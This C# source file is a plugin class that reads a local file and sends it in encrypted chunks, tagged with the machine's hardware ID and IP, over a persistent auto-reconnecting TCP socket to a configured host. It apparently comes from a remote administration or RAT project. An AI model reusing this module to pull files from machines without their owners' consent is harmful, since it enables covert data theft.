using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System;
using System.IO;
using System.Net.Sockets;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    internal class DownloadClientHandler : IDisposable
    {
        internal const int BUFFER_CHUNK_SIZE = 524288;//524288 (1024 * 512) // 1048576 = 1MB (1024*1024) // 2097152 (1024 * 2048) // 4194304 (2048 * 2048)
        public LoadingAPI loadingAPI { get; set; }
        private Socket socket { get; set; }
        public bool Connected { get; set; }
        public string HWID { get; set; }
        public string baseIp { get; set; }
        public bool closeClient { get; set; }



        public delegate bool ConnectAsync();
        private delegate int SendDataAsync(IPacket data);


        public ConnectAsync connectAsync;
        private readonly SendDataAsync sendDataAsync;


        public DownloadClientHandler(LoadingAPI loadingAPI) : base()
        {
            this.loadingAPI = loadingAPI;
            sendDataAsync = new SendDataAsync(SendData);
        }


        public void ConnectStart()
        {
            connectAsync = new ConnectAsync(Connect);
            connectAsync.BeginInvoke(new AsyncCallback(EndConnect), null);
        }

        private bool Connect()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                socket.Connect(loadingAPI.host.host, loadingAPI.host.port);
                return true;
            }
            catch { }
            return false;
        }
        public void EndConnect(IAsyncResult ar)
        {
            Connected = connectAsync.EndInvoke(ar);

            if (!Connected)
            {
                ConnectStart();
            }
        }

        public void StartSendingFile(string filePath) 
        {
            using (Stream source = File.OpenRead(filePath))
            {
                byte[] buffer = new byte[BUFFER_CHUNK_SIZE];//1MB 
                int bytesRead = 0;
                long totalSize = new FileInfo(filePath).Length;

                if (totalSize > BUFFER_CHUNK_SIZE)
                {
                    while ((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.baseIp, loadingAPI.HWID);
                        IAsyncResult ar = sendDataAsync.BeginInvoke(packetFile, null, null);

                        /*while (!ar.IsCompleted)
                            Thread.Sleep(50);
                        */
                        int size = sendDataAsync.EndInvoke(ar);

                        totalSize -= bytesRead;
                        if (totalSize < BUFFER_CHUNK_SIZE)
                            buffer = new byte[totalSize];
                    }
                }
                else 
                {
                    buffer = new byte[totalSize];
                    source.Read(buffer, 0, buffer.Length);
                    DownloadFilePacket packetFile = new DownloadFilePacket(buffer, filePath, loadingAPI.baseIp, loadingAPI.HWID);
                    IAsyncResult ar = sendDataAsync.BeginInvoke(packetFile, null, null);
                    int size = sendDataAsync.EndInvoke(ar);
                }
            }
            this.Dispose();
        }

        private int SendData(IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(loadingAPI.key);

                int total = 0;
                int size = encryptedData.Length;
                int datalft = size;
                byte[] header = new byte[5];
                socket.Poll(-1, SelectMode.SelectWrite);

                byte[] temp = BitConverter.GetBytes(size);

                header[0] = temp[0];
                header[1] = temp[1];
                header[2] = temp[2];
                header[3] = temp[3];
                header[4] = (byte)data.packetType;

                lock (socket)
                {
                    int sent = socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return size;
                }
            }
            catch (Exception)
            {
                Connected = false;
                return 0;
            }
        }

        public void Dispose()
        {
            socket.Close();
            socket.Dispose();
            socket = null;
        }
    }
}
